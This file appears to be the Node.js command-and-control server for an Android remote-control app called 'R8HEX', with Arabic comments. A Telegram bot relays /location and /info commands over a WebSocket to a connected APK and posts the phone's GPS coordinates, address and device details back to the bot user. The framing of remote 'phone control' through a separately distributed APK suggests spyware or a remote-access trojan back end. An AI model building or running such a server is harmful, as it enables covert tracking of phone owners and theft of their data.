const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const http = require('http');
const { token, id } = require('./data');

const app = express();
const server = http.createServer(app);

// 🔧 إصلاح مشكلة البوت - استخدام webhook بدل polling
const bot = new TelegramBot(token, {
    webHook: {
        port: process.env.PORT || 10000
    }
});

// 🎯 إعداد webhook لـ Render
const WEBHOOK_URL = `https://bot-d4k2.onrender.com/bot${token}`;
bot.setWebHook(WEBHOOK_URL);

// 🚀 WebSocket على نفس السيرفر
const wss = new WebSocket.Server({ 
    server: server,
    path: '/ws'
});

// تخزين البيانات
const connectedPhones = new Map();

// 🎯 معالجة طلبات webhook من التلجرام
app.use(express.json());
app.post(`/bot${token}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// 🎯 معالج الأمر /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    const welcomeMessage = `
🎮 **R8HEX - نظام التحكم في الهاتف**

✅ **السيرفر شغال بنجاح!**
🌐 **رابط WebSocket للـ APK**:
\`wss://bot-d4k2.onrender.com/ws\`

📱 **أرسل هذا الرابط لملف الـ APK**

🔧 **الأوامر المتاحة**:
/info - معلومات الجهاز
/location - الموقع الحالي

⚡ **المطور**: @A1BUG
    `;
    
    bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
});

// 📍 أمر الموقع
bot.onText(/\/location/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📍 جاري طلب الموقع من الهاتف...');
    
    // إرسال أمر للهاتف المتصل
    const phone = connectedPhones.get(chatId.toString());
    if (phone && phone.readyState === WebSocket.OPEN) {
        phone.send(JSON.stringify({
            type: 'command',
            command: 'get_location',
            chatId: chatId
        }));
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل. تأكد من أن الـ APK متصل بالسيرفر.');
    }
});

// 📱 أمر معلومات الجهاز
bot.onText(/\/info/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📊 جاري طلب معلومات الجهاز...');
    
    const phone = connectedPhones.get(chatId.toString());
    if (phone && phone.readyState === WebSocket.OPEN) {
        phone.send(JSON.stringify({
            type: 'command',
            command: 'get_device_info',
            chatId: chatId
        }));
    } else {
        bot.sendMessage(chatId, '❌ لا يوجد هاتف متصل.');
    }
});

// 🔌 معالج اتصالات WebSocket
wss.on('connection', (ws, req) => {
    console.log('📱 هاتف جديد متصل');
    
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            handlePhoneMessage(ws, message);
        } catch (error) {
            console.error('❌ خطأ في معالجة الرسالة:', error);
        }
    });

    ws.on('close', () => {
        // إزالة الهاتف من القائمة
        for (let [phoneId, connection] of connectedPhones.entries()) {
            if (connection === ws) {
                connectedPhones.delete(phoneId);
                console.log(`📱 الهاتف ${phoneId} انقطع`);
                break;
            }
        }
    });
});

// 📨 معالج رسائل الهاتف
function handlePhoneMessage(ws, message) {
    switch (message.type) {
        case 'register':
            // تسجيل الهاتف برقم المستخدم
            connectedPhones.set(message.chatId, ws);
            console.log(`✅ هاتف مسجل للمستخدم: ${message.chatId}`);
            
            // إرسال تأكيد للمستخدم
            bot.sendMessage(message.chatId, '✅ **تم الاتصال بالهاتف بنجاح!**\n\nيمكنك الآن استخدام الأوامر للتحكم في الهاتف.', { parse_mode: 'Markdown' });
            break;
            
        case 'location':
            bot.sendMessage(message.chatId, `
📍 **الموقع الحالي**:
🌍 الإحداثيات: ${message.lat}, ${message.lng}
🏠 العنوان: ${message.address || 'غير متوفر'}
            `);
            break;
            
        case 'device_info':
            bot.sendMessage(message.chatId, `
📱 **معلومات الجهاز**:
📟 النموذج: ${message.model}
🔢 الإصدار: ${message.version}
💾 الذاكرة: ${message.memory}
🖥️ الشاشة: ${message.display}
            `);
            break;
            
        case 'response':
            bot.sendMessage(message.chatId, `📨 ${message.text}`);
            break;
    }
}

// 🏠 صفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>R8HEX Phone Control</title>
                <style>
                    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                    .status { color: green; font-weight: bold; }
                </style>
            </head>
            <body>
                <h1>🎮 R8HEX Phone Control System</h1>
                <p class="status">✅ السيرفر شغال بنجاح</p>
                <p>📱 الأجهزة المتصلة: ${connectedPhones.size}</p>
                <p>🌐 WebSocket: <code>wss://bot-d4k2.onrender.com/ws</code></p>
                <p>⚡ المطور: @A1BUG</p>
            </body>
        </html>
    `);
});

// 🚀 تشغيل السيرفر
const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 R8HEX Server running on port ${PORT}`);
    console.log(`🤖 Bot: R8HEX_Bot`);
    console.log(`📱 WebSocket: wss://bot-d4k2.onrender.com/ws`);
    console.log(`🌐 Website: https://bot-d4k2.onrender.com`);
});

// 🔧 معالج الأخطاء
process.on('uncaughtException', (error) => {
    console.error('❌ خطأ غير متوقع:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ رفض غير معالج:', reason);
});
